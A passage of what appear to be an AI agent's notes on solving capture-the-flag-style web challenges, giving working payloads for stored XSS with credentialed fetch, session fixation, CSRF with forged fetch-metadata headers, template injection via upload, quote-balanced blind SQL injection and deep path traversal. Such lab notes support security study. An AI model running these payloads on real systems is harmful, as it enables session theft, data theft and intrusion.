cors`, `-Dest: empty`,\n  `Referer: <reflected URL>`, `Origin`, `X-Callback-Nonce: N` -> `effect: isolated_browser_callback`. 83 s. TT broke\n  on choosing the callback by the word `callback` (TT's was `/internal-<hex6>`) -> pick by key `secondary_route`.\n- **D07 Stored for Later (cal. 21)** -- stored XSS, real moderator bot. POST `{\"message\":\"<script>..fetch(DATA,\n  {credentials:'include'}) .. POST {evidence:t} to RCPT(id from location.pathname)</script>\",\"name\":\"guest\"}` to\n  `/api/messages`; poll `/messages/{id}`. 78 s. Mastery: `/api/postcards` variant (derive view from openapi/submit\n  `url`), receipt landed after 12 s, solver mutual recursion, submit 503 that had landed (`already_solved` on retry).\n- **D08 Session Impression (cal. 21)** -- session fixation. `GET /action-<hex6>?sid=<session_hint>` (`?session=`,\n  `?session_id=`, JSON, `X-Session-Id`, cookies all failed) -> `Set-Cookie: arena_session=<hint>`; `GET\n  /status-<hex6>` with that cookie -> `effect: fixed_session_privilege_transfer`. 116 s. Mastery (3 targets) ~15 min:\n  racing every solver on every target starved the app -> recon-gate the probes.\n- **D09 Forged With Care (cal. 22)** -- CSRF judged server-side by fetch-metadata (no bot). Clues: `feature_route:\n  /submit-<hex6>`, `preferences_route: /preferences`. `GET /` sets `arena_session`; `/preferences` holds `<form\n  method='get' action='/submit-<hex6>'>` with `<select name=destination>` (`daily` | `review-NNNN@outside.example.\n  invalid`) + hidden `csrf_token` (= session value). Bare/same-site submit -> `changed_across_sites:false`;\n  missing cookie -> `signed_in_session_required`; bad option -> `invalid_destination`. Worked: `curl --max-time 20 -b\n  arena_session=S -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Dest: document' -H\n  'Referer: https://evil.example/' '<base>/submit-<hex6>?destination=review-NNNN%40outside.example.invalid'`, then\n  `GET /api/preferences` -> `{\"destination\":..,\"changed_across_sites\":true,\"evidence\":\"proof_..\"}`. Token optional.\n  Single CORRECT 70 s. TT `solver_incomplete` (41 s generic race, no CSRF handler; live worker hand-solved);\n  generalized `csrf()` form parser ~5 requests ~1 s. Mastery 3 targets CORRECT, solve 4.9 s.\n- **D10 Uploading Expectations (cal. 22)** -- unrestricted upload rendered by a server-side template preview. Clues:\n  `feature_route` (`/execute|action|inspect-<hex6>`), `render_route` (`/account|internal|result-<hex6>`),\n  `preview_guide` (staff HTML previews evaluate `{{field}}`; objective field `objective`), `upload_policy` (\"txt,\n  text/plain\" -- not enforced), `upload_shape: \"POST JSON: filename, content, content_type\"`. Worked: POST\n  `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> `{\"path\":\"<render>?file=\n  note.html\"}` -> GET it -> proof in HTML. GET on the upload route -> `method_not_allowed`; wrong file ->\n  `file_not_found`. No code execution, no traversal needed. Single CORRECT 58 s. TT `solver_incomplete` (40.65 s\n  generic race, targets serial); generalized handler 3 requests. Mastery (D01 backup + D02 IDOR + D10) CORRECT,\n  solve 3.9 s with targets threaded.\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08). D09 has no `effect`: `changed_across_sites:true` + `evidence`. D10\n  prints the proof in the rendered preview HTML. D07 shows the proof in a moderator receipt on the entry page instead.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Choosing routes by the WORD in a clue value (`callback`, `messages`) -- words are re-dealt; use clue keys / openapi.\n- Routing by prompt keywords in Mastery: earlier-day targets get today's prompt (D04 missed T1).\n- One-level crawls: the D01 proof sits one link below the Disallow index.\n- Solvers importing each other's `fallback()` -> mutual recursion -> timeout. Import `answer()` only.\n- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Shipping a new day with only the generic `lib.web` race: a new class always misses it and burns ~40 s (D09, D10\n  TT). Write the class handler (keyed on the new clue key) into solve.py before TT; run Mastery targets in threads.\n- Trusting the app's stated policy (\"txt only\", \"token required\"): D09 token and D10 type rules were decorative --\n  try the forbidden form first, it is one request.\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap.** The search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the\n  classic tautology PAIR is NOT an oracle: `' OR '1'='1` and `' OR '1'='2` BOTH return all rows (the first clause\n  degenerates to `LIKE '%'`). \"Same result both ways\" is not \"not injectable.\" What works is QUOTE BALANCE:\n  `nope' OR (<cond>) OR '1'='2` makes every literal clause false and reduces the WHERE to `<cond>` (rows = TRUE,\n  0 rows = FALSE); calibrate on `1=1`/`1=2`. Backend is SQLite (`information_schema` absent); the proof is the\n  `summary` of the hidden row — `... WHERE summary LIKE char(112,114,111,111,102,37)` spells `'proof%'` without a\n  quote. Odd-quote / `--` / `#` / `;` / `%'`-breakout payloads all dead-end. (`lib/web/handlers` ladder now carries a\n  quote-balanced payload.)\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2 traversal; escalate to >= 3 `../` into the\n  absolute path the prompt names (measured `/run/huntress/objective.txt`). The viewer script/param name re-rolls —\n  read it off the root page's links. (`doc` + a deep huntress-objective payload added to the ladder.)\n- **`control_unavailable` is TRANSIENT, not terminal.** An `op=start` can answer `control_unavailable` after a hang\n  (measured 26.7 s on 2026-10-22); a plain `op=start` resend succeeded on try 1. Treat it as unjudged — back off and\n  re-send — never as a gate or a dead route. (`webtarget.terminal()` now classes it with `rate_limited`.)\n","userModified":false},"tool_result_meta":[{"id":"toolu_0129ZWmjorCGaZZhQdqjm3NW","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
